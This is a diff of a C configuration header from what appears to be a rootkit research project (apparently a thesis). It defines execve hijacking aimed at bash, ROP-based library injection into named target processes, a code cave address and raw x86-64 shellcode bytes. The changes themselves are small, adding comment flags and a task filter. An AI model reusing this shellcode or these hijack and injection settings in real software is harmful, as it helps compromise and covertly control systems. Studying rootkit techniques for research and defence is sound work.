@@ -24,12 +24,15 @@
 //EXECUTION HIJACKING
 
 #define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack\0"
-#define EXEC_HIJACK_ACTIVE_TEMP 0
+#define EXEC_HIJACK_ACTIVE_TEMP 0 //0 Deactivated, 1 active
 #define TASK_COMM_NAME_RESTRICT_HIJACK "bash"
 #define TASK_COMM_RESTRICT_HIJACK_ACTIVE 1
 
 //LIBRARY INJECTION WITH ROP
 #define TASK_COMM_NAME_INJECTION_TARGET_TIMERFD_SETTIME "simple_timer"
+#define TASK_COMM_FILTER 1 //0 do not filter by task. 1 filter by task.
+#define TASK_COMM_NAME_INJECTION_TARGET_OPEN "simple_open"
+
 #define CODE_CAVE_ADDRESS_STATIC 0x00000000004012c4
 #define CODE_CAVE_SHELLCODE_ASSEMBLE_1 \
 "\x55\x50\x51\x52\x53\x57\x56\
@@ -53,7 +56,5 @@
 \xd0\x48\x81\xc4\x00\x10\x00\x00\x5e\
 \x5f\x5b\x5a\x59\x58\x5d\xff\x25\x00\x00\x00\x00"
 #define CODE_CAVE_SHELLCODE_ASSEMBLE_3_LEN 37
-
-#define TASK_COMM_NAME_INJECTION_TARGET_OPEN "simple_open"
 
 #endif
